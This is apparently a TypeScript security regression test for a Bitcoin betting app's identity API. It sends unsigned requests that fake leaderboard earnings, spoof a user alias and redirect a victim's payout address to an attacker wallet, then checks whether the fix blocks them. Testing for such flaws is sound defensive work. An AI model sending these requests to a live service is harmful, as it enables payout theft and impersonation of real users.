import 'dotenv/config';

const API_URL = process.env.API_URL || 'http://localhost:3000';

let passed = 0;
let failed = 0;

function assert(condition: boolean, testName: string) {
    if (condition) { passed++; console.log(`  ✅ ${testName}`); }
    else { failed++; console.log(`  ❌ ${testName}`); }
}

async function testIdentitySpoofing() {
    console.log('\n=== HACKER TEST: Identity Spoofing (PR #3) ===\n');

    const victimPubkey = 'a'.repeat(64);

    console.log('Test 1: Set fake sats_earned for any pubkey');
    const res1 = await fetch(`${API_URL}/api/identity/${victimPubkey}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ alias: 'HACKED', sats_earned: 999999 })
    });
    const data1 = await res1.json();
    console.log(`  Response: ${res1.status} - ${JSON.stringify(data1)}`);

    if (res1.ok || res1.status === 200) {
        console.log('  ⚠️  MANUAL UPDATE accepted without signature!');
        const checkRes = await fetch(`${API_URL}/api/identity/${victimPubkey}`);
        const checkData = await checkRes.json();
        console.log(`  Current sats_earned: ${checkData.sats_earned}`);
        assert(checkData.sats_earned === 999999, 'sats_earned should be 999999');
    } else {
        console.log('  ✅ MANUAL UPDATE blocked (fix already applied)');
        assert(true, 'Identity spoofing prevented');
    }

    console.log('\nTest 2: Set fake alias (identity spoofing)');
    const res2 = await fetch(`${API_URL}/api/identity/${victimPubkey}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ alias: 'FakeUser' })
    });
    const data2 = await res2.json();
    console.log(`  Response: ${res2.status} - ${JSON.stringify(data2)}`);

    console.log('\nTest 3: Hijack payout (set lud16 to attacker wallet)');
    const attackerLud16 = 'attacker@getalby.com';
    const res3 = await fetch(`${API_URL}/api/identity/${victimPubkey}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ alias: 'HACKED', lud16: attackerLud16 })
    });
    const data3 = await res3.json();
    console.log(`  Response: ${res3.status} - ${JSON.stringify(data3)}`);

    if (res3.ok) {
        const checkRes = await fetch(`${API_URL}/api/identity/${victimPubkey}`);
        const checkData = await checkRes.json();
        console.log(`  Current lud16: ${checkData.lud16 || 'null'}`);
        console.log('  ⚠️  If victim wins, payout goes to attacker wallet!');
    }

    console.log('\n=== Summary ===');
    console.log('  This vulnerability allows:');
    console.log('  1. Fake leaderboard rankings (set sats_earned)');
    console.log('  2. Identity spoofing (set alias)');
    console.log('  3. Payout hijacking (set lud16 to attacker wallet)');
    console.log('\n  This vulnerability does NOT allow:');
    console.log('  - Changing the winning number (determined by Bitcoin block hash)');
    console.log('  - Forging bets without payment');
    console.log('  - Manipulating game state');

    console.log(`\n=== Identity Spoofing Tests Complete: ${passed} passed, ${failed} failed ===\n`);
}

testIdentitySpoofing().then(() => process.exit(failed > 0 ? 1 : 0));
